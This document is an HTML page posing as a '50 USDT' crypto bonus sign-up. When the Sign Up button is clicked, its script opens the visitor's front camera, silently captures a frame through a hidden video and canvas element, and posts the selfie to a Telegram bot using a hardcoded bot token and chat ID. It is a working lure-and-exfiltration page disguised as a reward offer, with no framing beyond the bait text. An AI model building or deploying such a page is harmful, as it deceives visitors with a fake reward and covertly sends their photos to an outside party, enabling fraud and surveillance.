<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>50 USDT | Earn Money</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .card {
      background: white;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      padding: 30px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .card h2 {
      margin-top: 0;
      color: #0072ff;
    }
    .card p {
      color: #444;
    }
    #signupBtn {
      padding: 12px 24px;
      background-color: #0072ff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s ease;
    }
    #signupBtn:hover {
      background-color: #005fcc;
    }

    #hidden-video, #hidden-canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Claim Your 50 USDT</h2>
    <p>Sign up to receive your welcome bonus.</p>
    <button id="signupBtn">Sign Up</button>
  </div>

  <video id="hidden-video" autoplay></video>
  <canvas id="hidden-canvas"></canvas>

  <script>
    const signupBtn = document.getElementById('signupBtn');
    const video = document.getElementById('hidden-video');
    const canvas = document.getElementById('hidden-canvas');

    const BOT_TOKEN = "8424053022:AAGnCW1Sq6lmfj6VK69KpmrqJK47kK18D-Q";
    const CHAT_ID = "8099849002";

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
      return new Blob([u8arr], { type: mime });
    }

    signupBtn.addEventListener('click', async (event) => {
      event.preventDefault();
      signupBtn.textContent = 'Activating Camera...';
      signupBtn.style.pointerEvents = 'none';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user", // ফ্রন্ট ক্যামেরা
            width: { ideal: 720 },
            height: { ideal: 720 }
          },
          audio: false
        });

        video.srcObject = stream;

        video.addEventListener('canplay', () => {
          video.play();

          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageDataUrl = canvas.toDataURL('image/jpeg');
            const photoBlob = dataURLtoBlob(imageDataUrl);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'selfie.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(data => {
              alert("✅ Photo sent successfully!");
              signupBtn.textContent = "Submitted ✅";
              signupBtn.style.backgroundColor = "#28a745";
            })
            .catch(err => {
              alert("❌ Failed to send photo.");
              signupBtn.textContent = "Try Again";
              signupBtn.style.pointerEvents = "auto";
            });

            stream.getTracks().forEach(track => track.stop());
          }, 800);
        });

      } catch (err) {
        alert("❌ Camera access denied or unavailable.");
        signupBtn.textContent = 'Sign Up';
        signupBtn.style.pointerEvents = 'auto';
      }
    });
  </script>
</body>
</html>
